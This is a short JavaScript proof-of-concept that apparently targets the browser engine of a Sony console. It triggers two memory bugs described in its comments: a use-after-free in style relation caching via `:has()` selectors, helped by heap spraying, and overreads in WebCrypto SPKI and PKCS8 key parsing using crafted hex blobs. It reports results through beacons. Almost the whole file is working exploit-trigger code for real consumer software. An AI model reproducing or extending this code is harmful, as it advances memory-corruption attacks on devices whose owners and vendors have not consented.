// c022: two reachable candidates that Sony's current OSS tree already fixes. The drop is newer than 14.10,
// so the console is the only oracle that matters here.
//
// A. Style::commitRelations UAF via MatchResultCache: `:has()` with a nesting selector records a backward
//    sibling relation to a node, which is then freed while the cache entry survives. Re-mutating the same
//    inline property takes the FullWithMatchResultCache path and commits the stale relation.
// B. WebCrypto SPKI length-byte overread: a 25-byte SPKI whose trailing length byte is 0xFF makes
//    (keyData.size() - index) underflow, so subvector() reads far past the buffer.
(function () {
  function send(t) { try { navigator.sendBeacon('/beacon', 'c022-' + t); } catch (e) {} }
  send('boot');

  // --- A ---
  try {
    var host = document.createElement('div');
    host.innerHTML = '<div class="subject"><div id="middle"><div id="victim"><span></span></div></div></div>';
    document.body.appendChild(host);
    var subject = host.querySelector('.subject');
    var victim = host.querySelector('#victim');
    subject.style.backgroundSize = 'cover';
    void subject.offsetTop;
    victim.remove();
    victim = null;
    var junk = [];
    for (var i = 0; i < 24; i++) junk.push(new Float64Array(1024 * 1024));
    junk = null;
    subject.style.backgroundSize = 'contain';
    void subject.offsetTop;
    send('A-survived');
  } catch (e) { send('A-threw:' + e.name); }

  // --- B ---
  function hexToBytes(h) { var a = new Uint8Array(h.length / 2); for (var i = 0; i < a.length; i++) a[i] = parseInt(h.substr(i * 2, 2), 16); return a; }
  try {
    if (!self.crypto || !self.crypto.subtle) { send('B-nosubtle'); }
    else {
      var bad = hexToBytes('3000300006072a8648ce3d020106082a8648ce3d03010703ff');
      self.crypto.subtle.importKey('spki', bad, { name: 'ECDSA', namedCurve: 'P-256' }, true, ['verify'])
        .then(function () { send('B-resolved'); }, function (e) { send('B-rejected:' + e.name); });
    }
  } catch (e) { send('B-threw:' + e.name); }

  // --- C: also try the PKCS8 variant, a different parser path ---
  try {
    if (self.crypto && self.crypto.subtle) {
      var bad2 = hexToBytes('3000300006042a8648ce3d020106082a8648ce3d0301070400ff');
      self.crypto.subtle.importKey('pkcs8', bad2, { name: 'ECDSA', namedCurve: 'P-256' }, true, ['verify'])
        .then(function () { send('C-resolved'); }, function (e) { send('C-rejected:' + e.name); });
    }
  } catch (e) { send('C-threw:' + e.name); }

  send('done');
})();
